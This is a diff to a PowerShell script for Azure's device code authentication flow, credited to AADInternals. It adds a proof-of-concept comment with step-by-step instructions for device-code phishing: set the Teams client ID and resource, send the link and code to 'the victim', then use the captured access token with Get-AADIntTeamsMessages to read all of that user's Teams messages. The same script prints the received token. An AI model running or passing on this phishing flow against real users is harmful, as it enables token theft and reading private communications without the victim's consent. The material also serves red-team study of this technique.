@@ -1,6 +1,17 @@
 # Azure Device Code Auth Flow
 # Some of the code here was taken from AADInternals (https://github.com/Gerenios/AADInternals/blob/master/KillChain.ps1)
 
+<# POC With Teams Mssages: 
+In the script change the clientid and resources as following:
+$clientid = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+$body=@{
+    "client_id" = $clientId
+    "resource" =  "https://api.spaces.skype.com"
+}
+Then run the script, send the link and code to the victim, and once the authentication is done, you can use the resulting access token directly with AADInternals:
+Get-AADIntTeamsMessages -AccessToken "<accesstoken>" 
+This will list all the Teams messages this user has access to.
+#>
 ############## Read-AccessToken function ####################
 # Parse access token and return it as PS object
 function Read-Accesstoken
@@ -117,4 +128,5 @@ if([String]::IsNullOrEmpty($user))
 {
     $user = (Read-Accesstoken -AccessToken $response.access_token).unique_name
 }
+
 Write-Host "Received access token for $user`:`r`n$($response | ConvertTo-Json)"
